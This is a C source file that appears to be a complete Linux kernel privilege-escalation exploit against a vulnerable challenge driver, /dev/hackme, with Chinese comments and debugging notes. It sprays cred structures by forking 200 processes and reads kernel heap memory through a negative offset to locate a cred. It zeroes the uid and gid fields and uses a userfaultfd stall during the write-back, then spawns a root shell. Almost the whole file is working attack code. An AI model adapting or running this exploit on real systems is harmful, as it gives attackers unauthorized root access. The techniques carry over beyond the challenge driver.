#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <signal.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <assert.h>

#define ALLOC 0x30000
#define DEL 0x30001
#define READ 0x30003
#define WRITE 0x30002

//static long uffd;

struct arg
{
	size_t idx;
	void *addr;
	long long len;
	long long offset;
};

void alloc(int fd,int idx,char *user,long long len){
	struct arg cmd;
	cmd.idx = idx;
	cmd.len = len;
	cmd.addr = user;
	ioctl(fd,ALLOC,&cmd);
}

void delete(int fd,int idx){
	struct arg cmd;
	cmd.idx = idx;
	ioctl(fd,DEL,&cmd);
}

void read_from_kernel(int fd,int idx,char *user,long long len,long long offset){
	struct arg cmd;
	cmd.idx = idx;
	cmd.len = len;
	cmd.addr = user;
	cmd.offset = offset;
	ioctl(fd,READ,&cmd);	
}
void write_to_kernel(int fd,int idx,char *user,long long len,long long offset){
	struct arg cmd;
	cmd.idx = idx;
	cmd.len = len;
	cmd.addr = user;
	cmd.offset = offset;
	ioctl(fd,WRITE,&cmd);	
}

void print_hex( char *buf,int size){
	int i;
	puts("======================================");
	printf("data :\n");
	for (i=0 ; i<(size/8);i++){
		if (i%2 == 0){
			printf("%d",i/2);
		}
		printf(" %16llx",*(size_t * )(buf + i*8));
		if (i%2 == 1){
			printf("\n");
		}		
	}
	puts("======================================");
}

void get_root(uint32_t i)
{
	while (1) 
	{
		sleep(1);
		if (getuid() == 0)
		{
			printf("[+] got root at thread: %d\n", i);
			execl("/bin/sh", "sh", NULL);
			exit(0);
		}
	}
}

void errExit(char* msg)
{
	puts(msg);
	exit(-1);
}

void* handler(void *arg)
{
	struct uffd_msg msg;
	unsigned long uffd = (unsigned long)arg;
	puts("[+] handler created");

	struct pollfd pollfd;
	int nready;
	pollfd.fd      = uffd;
	pollfd.events  = POLLIN;
	nready = poll(&pollfd, 1, -1);
	if (nready != 1)  // 这会一直等待，直到copy_from_user/copy_to_user访问FAULT_PAGE
		errExit("[-] Wrong pool return value");
	printf("[+] Trigger! I'm going to hang\n");

	if (read(uffd, &msg, sizeof(msg)) != sizeof(msg)) // 从uffd读取msg结构，虽然没用
		errExit("[-] Error in reading uffd_msg");
	assert(msg.event == UFFD_EVENT_PAGEFAULT);
	printf("[+] fault page handler finished");
	sleep(1000);
	/*
	char buffer[0x1000];   // 预先设置好buffer内容，往缺页处进行拷贝
	struct uffdio_copy uc;
	memset(buffer, 0, sizeof(buffer));
	buffer[8] = 0xf0;

	uc.src = (unsigned long)buffer;
	uc.dst = (unsigned long)fault_page;
	uc.len = fault_page_len;
	uc.mode = 0;
	ioctl(uffd, UFFDIO_COPY, &uc); // 恢复执行copy_from_user
	*/
	return 0;
}

void register_userfault(uint64_t fault_page, uint64_t fault_page_len)
{
	struct uffdio_api ua;
	struct uffdio_register ur;
	pthread_t thr;

	uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // create the user fault fd
	ua.api = UFFD_API;
	ua.features = 0;
	if (ioctl(uffd, UFFDIO_API, &ua) == -1)
		errExit("[-] ioctl-UFFDIO_API");
	//if (mmap(fault_page, fault_page_len, 7, 0x22, -1, 0) != fault_page) // PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,  //create page used for user fault
	//	errExit("[-] mmap fault page");
	ur.range.start = (unsigned long)fault_page;
	ur.range.len   = fault_page_len;
	ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
		errExit("[-] ioctl-UFFDIO_REGISTER");  //注册页地址与错误处理fd，这样只要copy_from_user
											   //访问到FAULT_PAGE，则访问被挂起，uffd会接收到信号
	int s = pthread_create(&thr, NULL, handler, (void*)uffd); // handler函数进行访存错误处理
	if (s!=0)
		errExit("[-] pthread_create");
    return;
}

#define MAX_DATA_SIZE 0x160000
#define SEARCH_SIZE 0x10000
int main(){
	uint64_t fault_page;
	uint64_t fault_page_len;
	int fd = open("/dev/hackme", O_RDONLY);
	if (fd < 0 )
	{
		printf("[-] bad open /dev/hackme\n");
		exit(-1);
	}
    // Step 1: create 200 cred to fill in heap
	for (int i=0; i<200; i++)
	{
		if (fork() == 0)
			get_root(i);
	}
	// Step 2: read and find cred
	char *mem = malloc(MAX_DATA_SIZE);
	alloc(fd, 0, mem, 0x100);
	read_from_kernel(fd, 0, mem, MAX_DATA_SIZE, -MAX_DATA_SIZE);
	uint32_t *array = (uint32_t*)mem;
	uint32_t cred_offset = 0;
	//uint32_t count = 0;
	printf("[+] begin to search cred");
	for (int i = 0; i < SEARCH_SIZE/4; i++)
	{
		if (array[i] == 1000 && array[i+1] == 1000 && array[i+2] == 1000 && array[i+3] == 1000 && array[i+4] == 1000 && array[i+5] == 1000 && array[i+6] == 1000 && array[i+7] == 1000)
		{
			printf("[+] find cred at offset: 0x%x\n", i*4);
			for (int j = 0; j<8; j++)
				array[i+j] = 0;
			cred_offset = i*4;
			break;
		}
	}
	if (cred_offset == 0)
	{
		printf("[-] Cannot find cred");
		exit(-1);
	}

	// Step 3: set up userfaultfd and re-write cred
	char *new_mem = (char *) mmap(NULL, MAX_DATA_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	memcpy(new_mem, mem, SEARCH_SIZE);
	fault_page = (uint64_t)new_mem + SEARCH_SIZE;
	fault_page_len = MAX_DATA_SIZE - SEARCH_SIZE;
	register_userfault(fault_page, fault_page_len);
	write_to_kernel(fd, 0, new_mem, MAX_DATA_SIZE, -MAX_DATA_SIZE);

	get_root(0);

}

/*  
add-symbol-file ./initramfs.cpio 0xffffffffc01d3000

0x640 pool          为什么是偏移0x2400处

0x13A    0x30001   free
0xD1     0x30002   write
0x8D     0x30003   read
0x16E    0x30000   alloc

*/
